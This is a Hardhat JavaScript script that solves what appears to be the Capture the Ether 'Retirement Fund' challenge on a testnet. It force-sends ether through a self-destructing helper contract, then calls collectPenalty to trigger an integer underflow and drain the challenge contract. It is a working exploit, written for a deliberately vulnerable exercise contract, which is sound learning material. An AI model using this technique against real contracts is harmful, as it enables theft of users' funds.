const { ethers } = require("hardhat");

async function main() {
    const abi = [
        {"constant":false,"inputs":[],"name":"collectPenalty","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
        {"constant":false,"inputs":[],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
        {"constant":true,"inputs":[],"name":"isComplete","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},
        {"inputs":[{"name":"player","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"}
    ];

    //The contract address - Just copy it from the CTE challenge page
    const contractAddress = ethers.utils.getAddress("0x478A0B879359A86F831C4583bc88E2a5b5500188");

    /* 
    * To solve the challenge, you neeed to use your ropsten account, as CTE is expecting that account address.
    * To that effect, you need to export your private key from metamask and place it in the hardhat.config.js - the template is already there.
    * Then, we can get your wallet as the signer. The console.log should print your ropsten account address.
    */
    const [signer] = await ethers.getSigners();
    console.log("SIGNER: ", signer.address)


    //First, we deploy our helper contract
    console.log("Deploying contract with the account:", signer.address);
    const RetirementFundHelperContractFactory = await ethers.getContractFactory("RetirementFundHelper");
    const RetirementFundHelperContract = await RetirementFundHelperContractFactory.deploy({value: ethers.utils.parseEther("1")});
    console.log("Retirement Fund Helper Contract address:", RetirementFundHelperContract.address);
    

    //Then, we get the CTE challenge contract and connect using your account
    let cteContract = new ethers.Contract(contractAddress, abi, signer);

    //Now, we destruct our helper contract
    let killTx = await RetirementFundHelperContract.kill();
    let killTxReceipt = await killTx.wait();
    console.log("OUR CONTRACT HAS BEEN DESTROYED: ", killTxReceipt);

    //And now, we can call the collectPenalty function, which will underflow and allow us to drain the contract ETH balance
    let collectPenaltyTx = await cteContract.collectPenalty();
    let collectPenaltyTxReceipt = await collectPenaltyTx.wait();
    console.log("WE'VE DRAINED THE CHALLENGE CONTRACT: ", collectPenaltyTxReceipt);
}

main()
.then(() => process.exit(0))
.catch((error) => {
    console.log(error);
    process.exit(1);
});